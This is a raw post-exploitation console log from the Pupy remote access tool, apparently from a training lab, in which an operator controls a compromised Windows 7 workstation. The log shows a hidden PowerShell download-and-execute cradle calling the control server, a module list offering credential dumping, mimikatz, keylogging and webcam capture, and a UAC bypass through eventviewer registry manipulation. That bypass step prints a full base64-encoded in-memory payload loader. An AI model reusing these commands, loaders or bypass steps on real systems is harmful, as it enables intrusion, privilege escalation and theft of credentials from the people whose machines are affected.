
[*] Session 1 opened (RESEARCH\kroberts) (172.16.11.106:8888 <- 172.16.0.7:39512)
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1396 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3384 C:\Windows\System32\conhost.exe 2614504301540442218206115356152445613-842565451-2082273366-42057440-1409489348
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
>> ls
C:\:
  23/12/18  D      0.0B $Recycle.Bin                            
  14/07/09  D      0.0B Documents and Settings                  
  16/01/19  D      0.0B MSOCache                                
  13/07/09  D      0.0B PerfLogs                                
  16/01/19  D      0.0B Program Files                           
  16/01/19  D      0.0B Program Files (x86)                     
  16/01/19  D      0.0B ProgramData                             
  28/11/18  D      0.0B Recovery                                
  13/02/19  D      0.0B System Volume Information               
  23/12/18  D      0.0B Users                                   
  16/01/19  D      0.0B Windows                                 
  21/12/18  D      0.0B found.000                               
  13/02/19         1.5G hiberfil.sys                            
  13/02/19         2.0G pagefile.sys                            
[%] Summary: Files: 2 (size: 3.5G) Dirs: 12 Total: 14
>> help
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ ALIASED MODULES }
MODULE   DESCRIPTION                                        
------------------------------------------------------------
alive    request to send keepalive packets on rpyc level    
cp       copy file or directory                             
exit     exit the client on the other side                  
rm       remove a file or a directory                       
netstat  list terminal sessions                             
last     list terminal sessions                             
w        list terminal sessions                             
cd       change directory                                   
date     Get current date                                   
ps       list processes                                     
mkdir    create an empty directory                          
forward  Local/remote port forwarding and SOCKS proxy       
ls       list system files                                  
pwd      Get current working dir                            
cat      show contents of a file                            
mv       move file or directory                             
ip       list interfaces                                    
getpid   list process information                           
http     Trivial Get/Post requests via HTTP protocol        
getppid  list parent process information                    
getuid   get username                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        

Use help -M command to show all available modules
>> listen show
[-] listen: unrecognized arguments: show
usage: listen [-h] [-l | -L | -a TRANSPORT [TRANSPORT_ARG1 ...] | -A TRANSPORT
              [TRANSPORT_ARG1 ...] | -r TRANSPORT]

>> list -l
[-] Unknown (or unavailable) command list. Use help -M to list available commands and modules
>> help listen
Command: listen: start/stop/show current listeners

usage: listen [-h] [-l | -L | -a TRANSPORT [TRANSPORT_ARG1 ...] | -A TRANSPORT
              [TRANSPORT_ARG1 ...] | -r TRANSPORT]

start/stop/show current listeners

optional arguments:
  -h, --help            show this help message and exit
  -l, --list            show current listeners
  -L, --list-transports
                        show available transports
  -a TRANSPORT [TRANSPORT_ARG1 ...], --add TRANSPORT [TRANSPORT_ARG1 ...]
                        start listener
  -A TRANSPORT [TRANSPORT_ARG1 ...], --add-no-pproxy TRANSPORT [TRANSPORT_ARG1 ...]
                        start listener (ignore pproxy)
  -r TRANSPORT, --remove TRANSPORT
                        stop listener

>> listen 0l
[-] listen: unrecognized arguments: 0l
usage: listen [-h] [-l | -L | -a TRANSPORT [TRANSPORT_ARG1 ...] | -A TRANSPORT
              [TRANSPORT_ARG1 ...] | -r TRANSPORT]

>> listen -l
[+] tcp_cleartext: 172.16.11.106:8888
>> 
>> sessions
id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> help -M
{ COMMANDS }
COMMAND   DESCRIPTION                                                  
-----------------------------------------------------------------------
jobs      Manage Jobs                                                  
help      Show help                                                    
sessions  list/interact with established sessions                      
python    Start the local python interpreter (for debugging purposes)  
dnscnc    DNSCNC control                                               
exposed   list exposed objects/methods                                 
creds     Credentials manager                                          
tag       Assign tag to current session                                
exit      Exit Shell                                                   
connect   Connect to the bind payload                                  
run       Run a module on one or multiple clients                      
logging   Show/set log level                                           
config    Work with configuration file                                 
gen       Generate payload                                             
restart   Restart pupysh                                               
listen    start/stop/show current listeners                            

{ MODULES }
CATEGORY  NAME               HELP                                                                                                              
-----------------------------------------------------------------------------------------------------------------------------------------------
admin     clear_logs         Clear Event Logs                                                                                                  
admin     psh                Load/Execute Powershell Scripts                                                                                   
admin     ssh                Ssh Client                                                                                                        
admin     rfs                Mount Remote Fs As Fuse Fs To Mountpoint                                                                          
admin     reg                Search/List/Get/Set/Delete Registry Keys/Values                                                                   
admin     smbspider          Walk Through A Smb Directory And Recursively Search A String Into Files                                           
admin     shell_exec         Execute Shell Commands On A Remote System                                                                         
admin     logs               Show Logs (Or Try To Search Something)                                                                            
admin     alive              Request To Send Keepalive Packets On Rpyc Level                                                                   
admin     rdesktop           Start A Remote Desktop Session Using A Browser Websocket Client                                                   
admin     cp                 Copy File Or Directory                                                                                            
admin     interactive_shell  Open An Interactive Command Shell With A Nice Tty                                                                 
admin     shares             List Local And Remote Shared Folder And Permission                                                                
admin     rm                 Remove A File Or A Directory                                                                                      
admin     smb                Copy Files Via Smb Protocol                                                                                       
admin     hibernate          Close Session During X Hours                                                                                      
admin     netstat            List Terminal Sessions                                                                                            
admin     become             Become User                                                                                                       
admin     sshell             Interactive Ssh Shell                                                                                             
admin     last               List Terminal Sessions                                                                                            
admin     rdp                Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host                                   
admin     w                  List Terminal Sessions                                                                                            
admin     getdomain          Get Primary Domain Controller                                                                                     
admin     cd                 Change Directory                                                                                                  
admin     date               Get Current Date                                                                                                  
admin     pexec              Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen                             
admin     ps                 List Processes                                                                                                    
admin     zip                Zip / Unzip File Or Directory                                                                                     
admin     mkdir              Create An Empty Directory                                                                                         
admin     dns                Retrieve Domain Name From Ip And Vice Versa                                                                       
admin     ls                 List System Files                                                                                                 
admin     psexec             Launch Remote Commands Using Smbexec Or Wmiexec                                                                   
admin     pwd                Get Current Working Dir                                                                                           
admin     pyexec             Execute Python Code On A Remote System                                                                            
admin     beroot             Check For Privilege Escalation Path                                                                               
admin     cat                Show Contents Of A File                                                                                           
admin     pyshell            Open An Interactive Python Shell On The Remote Client                                                             
admin     mv                 Move File Or Directory                                                                                            
admin     display            Set Display Variable                                                                                              
admin     ip                 List Interfaces                                                                                                   
admin     getpid             List Process Information                                                                                          
admin     sudo_alias         Write An Alias For Sudo To Retrieve User Password                                                                 
admin     igd                Upnp Igd Client                                                                                                   
admin     stat               Show A Bit More Info About File Path. Acls/Caps/Owner For Now                                                     
admin     http               Trivial Get/Post Requests Via Http Protocol                                                                       
admin     x509               Fetch Certificate From Server                                                                                     
admin     getppid            List Parent Process Information                                                                                   
admin     drives             List Valid Drives In The System                                                                                   
admin     services           List Services                                                                                                     
admin     getuid             Get Username                                                                                                      
creds     loot_memory        Crawl Processes Memory And Look For Cleartext Credentials                                                         
creds     creddump           Download The Hives From A Remote Windows System And Dump Creds                                                    
creds     lazagne            Retrieve Passwords Stored On The Target                                                                           
creds     mimipy             Run Mimipy To Retrieve Credentials From Memory                                                                    
creds     memstrings         Dump Printable Strings From Process Memory For Futher Analysis                                                    
exploit   mimishell          Execute Mimikatz From Memory (Interactive)                                                                        
exploit   mimikatz           Execute Mimikatz From Memory (Non-Interactive)                                                                    
exploit   exploit_suggester  Exploit Suggester                                                                                                 
exploit   shellcode_exec     Executes The Supplied Shellcode On A Client                                                                       
exploit   impersonate        List/Impersonate Process Tokens                                                                                   
gather    keylogger          A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)                                      
gather    hashmon            Try To Find Clear Text Passwords In Memory                                                                        
gather    get_info           Get Some Informations About One Or Multiple Clients                                                               
gather    contacts           To Get Contacts                                                                                                   
gather    isearch            Use Windows Search Index To Search For Data                                                                       
gather    search             Walk Through A Directory And Recursively Search A String Into Files                                               
gather    check_vm           Check If Running On Virtual Machine                                                                               
gather    outlook            Interact With Outlook Session Of The Targeted User                                                                
gather    record_mic         Record Sound With The Microphone !                                                                                
gather    pywerview          Rewriting Of Some Powerview'S Functionalities In Python                                                           
gather    apps               To Interact Manage Applications                                                                                   
gather    call               To Get Call Details                                                                                               
gather    mouselogger        Log Mouse Clicks And Take Screenshots Of Areas Around It                                                          
gather    powerview          Execute Powerview Commands                                                                                        
gather    get_hwuuid         Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)                                                                  
gather    webcamsnap         Take A Webcam Snap :)                                                                                             
gather    usniper            Globally Capture String Or Register During Execution At Specified                                                 
gather    cloudinfo          Retrieve Ec2/Digitalocean Metadata                                                                                
gather    users              Get Interactive Users                                                                                             
gather    screenshot         Take A Screenshot :)                                                                                              
gather    ttyrec             Globally Capture Intput/Output To Tty. Compatible With Kernels                                                    
gather    gpstracker         To Interact With Gps                                                                                              
general   exit               Exit The Client On The Other Side                                                                                 
general   process_kill       Kill A Process                                                                                                    
manage    getprivs           Manage Current Process Privileges                                                                                 
manage    edit               Edit Remote File Locally (Download->Edit->Upload)                                                                 
manage    upload             Upload A File/Directory To A Remote System                                                                        
manage    hide_process       Edit Current Process Argv & Env Not To Look Suspicious                                                            
manage    download           Download A File/Directory From A Remote System                                                                    
manage    tasks              Get Info About Registered Background Tasks                                                                        
manage    memory_exec        Execute A Executable From Memory                                                                                  
manage    lock_screen        Lock The Session                                                                                                  
manage    duplicate          Duplicate The Current Pupy Payload By Executing It From Memory                                                    
manage    load_package       Load A Python Package Onto A Remote Client. Packages Files Must Be Placed In One Of The Pupy/Packages/<Os>/<Arch>/
manage    migrate            Migrate Pupy Into Another Process Using Reflective Dll Injection                                                  
manage    write              Write Short String To File                                                                                        
manage    env                List/Get/Set/Unset Client Environment Variables                                                                   
manage    persistence        Enable / Disable Persistence                                                                                      
network   port_scan          Run A Tcp Port Scan                                                                                               
network   forward            Local/Remote Port Forwarding And Socks Proxy                                                                      
network   tcpdump            Module To Reproduce Some Of The Classic Tcpdump Tool Functions                                                    
privesc   getsystem          Try To Get Nt Authority System Privileges                                                                         
privesc   bypassuac                                                                                                                            
privesc   inveigh            Execute Inveigh Commands                                                                                          
privesc   privesc_checker    Linux Privilege Escalation Scripts                                                                                
troll     text_to_speach     Use Android Text To Speach To Say Something :)                                                                    
troll     vibrate            Activate The Phone/Tablet Vibrator :)                                                                             
troll     msgbox             Pop Up A Custom Message Box                                                                                       

{ ALIASES }
ALIAS    COMMAND            
----------------------------
info     get_info           
pyexec   pyexec             
exec     shell_exec         
ps       ps                 
migrate  migrate            
shell    interactive_shell  
kill     process_kill       
mount    drives             
du       download -S        
>> help bypassuac
Module: bypassuac: 

usage: bypassuac [-h] [-l] [-e EXE] [-r] [-m METHOD]

optional arguments:
  -h, --help  show this help message and exit
  -l          List all possible techniques for this host
  -e EXE      Custom exe to execute as admin
  -r          Restart current executable as admin
  -m METHOD   Should be an ID, get the list scanning which methods are
              possible (-l)


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> ps
   0 {System Idle Process} 
   4 {System} 
 132 {winlogbeat.exe} 
 264 {smss.exe} 
 276 {svchost.exe} 
 340 {csrss.exe} 
 376 {wininit.exe} 
 384 {csrss.exe} 
 424 {winlogon.exe} 
 436 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:crashpad-handler --no-upload-gzip --no-rate-limit --capture-python --no-identify-c
 472 {services.exe} 
 480 {lsass.exe} 
 488 {lsm.exe} 
 584 {svchost.exe} 
 656 {svchost.exe} 
 740 {MsMpEng.exe} 
 832 {svchost.exe} 
 864 {svchost.exe} 
 920 {svchost.exe} 
 992 {svchost.exe} 
1040 {Sysmon64.exe} 
1044 {svchost.exe} 
1148 {spoolsv.exe} 
1180 {svchost.exe} 
1200 C:\Windows\System32\taskhost.exe 
1292 {armsvc.exe} 
1312 {auditbeat.exe} 
1396 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.
1444 {cagent.exe} 
1512 {DbxSvc.exe} 
1560 {svchost.exe} 
1684 {svchost.exe} 
1712 {metricbeat.exe} 
1892 {osqueryd.exe} 
1940 {TeamViewer_Service.exe} 
1980 {ossec-agent.exe} 
2012 {packetbeat.exe} 
2060 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe -type:exit-monitor -method:collectupload -session-token:e1e07ed6-db78-4f9b-b4f9-77ae9b0a
2332 {unsecapp.exe} 
2368 {WmiPrvSE.exe} 
2396 C:\Windows\explorer.exe 
2464 {WmiPrvSE.exe} 
2668 C:\Program Files (x86)\Dropbox\Client\Dropbox.exe /systemstartup
2816 C:\Program Files\Microsoft Security Client\msseces.exe -hide -runkey
2864 {osqueryd.exe} 
2872 {conhost.exe} 
3176 {WmiPrvSE.exe} 
3384 C:\Windows\System32\conhost.exe 2614504301540442218206115356152445613-842565451-2082273366-42057440-1409489348
3428 \192.168.1.10\share\Labs\DAY-2\Lab-5\QclientX64.exe 
3516 C:\Windows\System32\dwm.exe 
3532 {rundll32.exe} 
3824 {GoogleCrashHandler.exe} 
3892 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\DbRcyAp0FOJJ.exe 
3948 {GoogleCrashHandler64.exe} 
3980 {SearchIndexer.exe} 
4024 {taskhost.exe} 
4864 {TrustedInstaller.exe} 
4904 C:\Windows\System32\notepad.exe C:\Users\kroberts.RESEARCH\Desktop\CbsPersist_20190114040043.log
5108 C:\Users\kroberts.RESEARCH\AppData\Local\Temp\BGr4up2eObHA.exe 

>> info
hostname       RSRCH-WIN7-WS1                                             
user           RESEARCH\kroberts                                          
release        7                                                          
version        6.1.7601                                                   
os_arch        AMD64                                                      
proc_arch      32bit                                                      
pid            1396                                                       
exec_path      C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
cid            0000000006b319b0                                           
address        172.16.0.7                                                 
macaddr        1e:97:2d:f3:32:85                                          
revision       ?                                                          
node           1e972df33285                                               
native         True                                                       
proxy          ?                                                          
external_ip    ?                                                          
uac_lvl        2/3                                                        
intgty_lvl     Medium                                                     
local_adm      Yes                                                        
transport      tcp_cleartext                                              
launcher       connect                                                    
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext        
platform       windows/x86                                                
>> bypassuac -l
[%] Comparing build number (7601) against 'Fixed In' build numbers, false positives might happen.

 Id:    Type:           Payload:        Admin:          Description:
 ----   -----------     -----------     --------        -----------------------
[-] 1	UAC bypass	True		False		Bypass UAC using runas, this only works if UAC is set to never notify
[-] 2	UAC bypass	True		False		Bypass UAC using fodhelper and registry key manipulation
[-] 3	UAC bypass	True		False		Bypass UAC using slui and registry key manipulation
[-] 4	UAC bypass	True		False		Bypass UAC using silentcleanup and registry key manipulation
[-] 5	UAC bypass	True		False		Bypass UAC using sdclt (isolatedcommand) and registry key manipulation
[-] 6	UAC bypass	True		False		Bypass UAC using sdclt (app paths) and registry key manipulation
[+] 7	UAC bypass	True		False		Bypass UAC using perfmon and registry key manipulation
[+] 8	UAC bypass	True		False		Bypass UAC using eventviewer and registry key manipulation
[+] 9	UAC bypass	True		False		Bypass UAC using compmgmtlauncher and registry key manipulation
[-] 10	UAC bypass	True		False		Bypass UAC using computerdefaults and registry key manipulation
[+] 11	UAC bypass	True		False		Bypass UAC using cliconfg (DLL) and registry key manipulation
[+] 12	UAC bypass	True		False		Bypass UAC using mcx2prov (DLL) and registry key manipulation
[+] 13	UAC bypass	True		False		Bypass UAC using migwiz (DLL) and registry key manipulation
[+] 14	UAC bypass	True		False		Bypass UAC using sysprep (DLL) and registry key manipulation
>> help bypassuac
Module: bypassuac: 

usage: bypassuac [-h] [-l] [-e EXE] [-r] [-m METHOD]

optional arguments:
  -h, --help  show this help message and exit
  -l          List all possible techniques for this host
  -e EXE      Custom exe to execute as admin
  -r          Restart current executable as admin
  -m METHOD   Should be an ID, get the list scanning which methods are
              possible (-l)


{ Compatibility }
Y  PupyClient(id=1, user=RESEARCH\kroberts, hostname=RSRCH-WIN7-WS1, platform=Windows)  
>> bypassuac -e sysprep.exe -m 14
[!] This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts
>> bypassuac -e sysprep.exe -m 13
[!] This technique needs to upload a dll. It has been temporary disabled to avoid AV alerts
>> bypassuac -e sysprep.exe -m 7
[!] This technique does not work with custom exe, only work with cmd.exe
>> bypassuac -e cmd.exe -m 7
[!] This technique does not work with custom exe, only work with cmd.exe
>> bypassuac -m 7
[!] This technique does not work with custom exe, only work with cmd.exe
>> bypassuac -l
[%] Comparing build number (7601) against 'Fixed In' build numbers, false positives might happen.

 Id:    Type:           Payload:        Admin:          Description:
 ----   -----------     -----------     --------        -----------------------
[-] 1	UAC bypass	True		False		Bypass UAC using runas, this only works if UAC is set to never notify
[-] 2	UAC bypass	True		False		Bypass UAC using fodhelper and registry key manipulation
[-] 3	UAC bypass	True		False		Bypass UAC using slui and registry key manipulation
[-] 4	UAC bypass	True		False		Bypass UAC using silentcleanup and registry key manipulation
[-] 5	UAC bypass	True		False		Bypass UAC using sdclt (isolatedcommand) and registry key manipulation
[-] 6	UAC bypass	True		False		Bypass UAC using sdclt (app paths) and registry key manipulation
[+] 7	UAC bypass	True		False		Bypass UAC using perfmon and registry key manipulation
[+] 8	UAC bypass	True		False		Bypass UAC using eventviewer and registry key manipulation
[+] 9	UAC bypass	True		False		Bypass UAC using compmgmtlauncher and registry key manipulation
[-] 10	UAC bypass	True		False		Bypass UAC using computerdefaults and registry key manipulation
[+] 11	UAC bypass	True		False		Bypass UAC using cliconfg (DLL) and registry key manipulation
[+] 12	UAC bypass	True		False		Bypass UAC using mcx2prov (DLL) and registry key manipulation
[+] 13	UAC bypass	True		False		Bypass UAC using migwiz (DLL) and registry key manipulation
[+] 14	UAC bypass	True		False		Bypass UAC using sysprep (DLL) and registry key manipulation
>> bypassuac -m 8
[%] Using powershell payload
[%] Reverse connection mode: Configuring client with the same configuration as the (parent) launcher on the target

{ Configuration }
KEY            VALUE                                                
--------------------------------------------------------------------
launcher       connect                                              
launcher_args  --host 172.16.11.106:8888 --transport tcp_cleartext  
cid            112400816                                            

[+] Required credentials (found)
  + SSL_BIND_CERT
[+] Generating native payload with the current config from pupyx86.dll - size=3428864
[+] packing pupy into C# source ...
[+] compiling via mono command: mcs -target:library -debug- -optimize+ -unsafe -noconfig -sdk:2 -OUT:./pupy_WMgGDQNq.exe /home/ol/pupy/pupy/pupy_yxlau6.cs
warning CS8001: SDK path could not be resolved
Compilation succeeded - 1 warning(s)
[+] Wrapped .NET payload - size=3443200
[+] PowerLoader: Serving payload to pipe=7UF1OGNGUC for 90 seconds
[%] Bypass uac could take few seconds, be patient...
[%] PowerLoader: Thread started (pipe=7UF1OGNGUC, payload=3443200, md5=787faa5ed5f4c8d2a46ffb84f12c5014)
[%] PowerLoader: Open - OK
[%] PowerLoader: Push - OK
[+] PowerLoader: FLUSH - OK
[%] Attempting to run id (8) configured with payload (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -EncodedCommand JABwAHMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGkAcABlAHMALgBQAGkAcABlAFMAZQBjAHUAcgBpAHQAeQA7AAoAJABhAGwAbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AUwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIAKAAiAFMALQAxAC0AMQAtADAAIgApADsACgAkAGEAYwBsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4AUABpAHAAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGwAbAAsACIARgB1AGwAbABDAG8AbgB0AHIAbwBsACIALAAiAEEAbABsAG8AdwAiACkAOwAKACQAcABzAC4AQQBkAGQAQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAYQBjAGwAKQA7AAoAJABwAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAUwBlAHIAdgBlAHIAUwB0AHIAZQBhAG0AKAAiADcAVQBGADEATwBHAE4ARwBVAEMAIgAsACIASQBuACIALAAyACwAIgBCAHkAdABlACIALAAwACwAMwA0ADQAMwAyADAAMAAsADAALAAkAHAAcwApADsACgAkAHAALgBXAGEAaQB0AEYAbwByAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAkAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBCAGkAbgBhAHIAeQBSAGUAYQBkAGUAcgAoACQAcAApADsACgAkAGEAPQAkAHgALgBSAGUAYQBkAEIAeQB0AGUAcwAoADMANAA0ADMAMgAwADAAKQA7AAoAJAB4AC4AQwBsAG8AcwBlACgAKQA7AAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAKQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAWwAwAF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQBbADAAXQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACkAKQA7AA==)
[+] Successfully created Default key containing payload (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -EncodedCommand JABwAHMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGkAcABlAHMALgBQAGkAcABlAFMAZQBjAHUAcgBpAHQAeQA7AAoAJABhAGwAbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AUwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIAKAAiAFMALQAxAC0AMQAtADAAIgApADsACgAkAGEAYwBsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4AUABpAHAAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGwAbAAsACIARgB1AGwAbABDAG8AbgB0AHIAbwBsACIALAAiAEEAbABsAG8AdwAiACkAOwAKACQAcABzAC4AQQBkAGQAQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAYQBjAGwAKQA7AAoAJABwAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAUwBlAHIAdgBlAHIAUwB0AHIAZQBhAG0AKAAiADcAVQBGADEATwBHAE4ARwBVAEMAIgAsACIASQBuACIALAAyACwAIgBCAHkAdABlACIALAAwACwAMwA0ADQAMwAyADAAMAAsADAALAAkAHAAcwApADsACgAkAHAALgBXAGEAaQB0AEYAbwByAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAkAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBCAGkAbgBhAHIAeQBSAGUAYQBkAGUAcgAoACQAcAApADsACgAkAGEAPQAkAHgALgBSAGUAYQBkAEIAeQB0AGUAcwAoADMANAA0ADMAMgAwADAAKQA7AAoAJAB4AC4AQwBsAG8AcwBlACgAKQA7AAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAKQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAWwAwAF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQBbADAAXQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACkAKQA7AA==)
[%] Disabling file system redirection
[+] Successfully disabled file system redirection
[+] Successfully spawned process (C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -EncodedCommand JABwAHMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGkAcABlAHMALgBQAGkAcABlAFMAZQBjAHUAcgBpAHQAeQA7AAoAJABhAGwAbAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AUwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBlAHIAKAAiAFMALQAxAC0AMQAtADAAIgApADsACgAkAGEAYwBsAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4AUABpAHAAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGwAbAAsACIARgB1AGwAbABDAG8AbgB0AHIAbwBsACIALAAiAEEAbABsAG8AdwAiACkAOwAKACQAcABzAC4AQQBkAGQAQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAYQBjAGwAKQA7AAoAJABwAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABpAHAAZQBzAC4ATgBhAG0AZQBkAFAAaQBwAGUAUwBlAHIAdgBlAHIAUwB0AHIAZQBhAG0AKAAiADcAVQBGADEATwBHAE4ARwBVAEMAIgAsACIASQBuACIALAAyACwAIgBCAHkAdABlACIALAAwACwAMwA0ADQAMwAyADAAMAAsADAALAAkAHAAcwApADsACgAkAHAALgBXAGEAaQB0AEYAbwByAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAkAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBCAGkAbgBhAHIAeQBSAGUAYQBkAGUAcgAoACQAcAApADsACgAkAGEAPQAkAHgALgBSAGUAYQBkAEIAeQB0AGUAcwAoADMANAA0ADMAMgAwADAAKQA7AAoAJAB4AC4AQwBsAG8AcwBlACgAKQA7AAoAWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGEAKQAuAEcAZQB0AFQAeQBwAGUAcwAoACkAWwAwAF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQBbADAAXQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAQAAoACkAKQA7AA==)
[+] Successfully cleaned up, enjoy!
>> sessions
id  user               hostname        platform  release  os_arch  proc_arch  intgty_lvl  address     tags  
------------------------------------------------------------------------------------------------------------
1   RESEARCH\kroberts  RSRCH-WIN7-WS1  Windows   7        AMD64    32bit      Medium      172.16.0.7        
>> info
hostname       RSRCH-WIN7-WS1                                             
user           RESEARCH\kroberts                                          
